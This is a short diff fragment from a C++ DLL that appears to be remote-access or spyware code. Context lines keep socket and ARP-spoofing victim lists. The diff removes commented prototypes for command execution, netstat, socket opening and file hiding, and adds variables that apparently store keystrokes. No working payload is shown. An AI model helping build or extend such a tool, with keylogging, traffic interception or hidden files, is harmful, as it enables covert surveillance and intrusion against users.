@@ -5,20 +5,8 @@
 
 vector<SOCKET*> sockets;
 vector<Arpspoof*> spoofvictims;
-
-
-
-//string RunNetstat(string nothing);
-//string GetAllFiles(string dir);
-//string OpenSocket(string ip_and_port);
-//string exec(string cmd);
-//string getFilePermissions(perms p);
-//void getAllFilesInDir(const string &dirPath, vector<MyFileClass> listOfFiles);
-//bool ConnectToHost(const char *PortNo, const char* IPAddress, SOCKET* s);
-//void CloseConnection(SOCKET s);
-//void NewFunction(std::string &ip_and_port);
-//string HideFileOrFolder(string pathtofileorfolder);
-//string ChangeFile(string file);
+string kl;
+bool storeKeys;
 
 BOOL APIENTRY DllMain(HMODULE hModule,
 	DWORD  ul_reason_for_call,
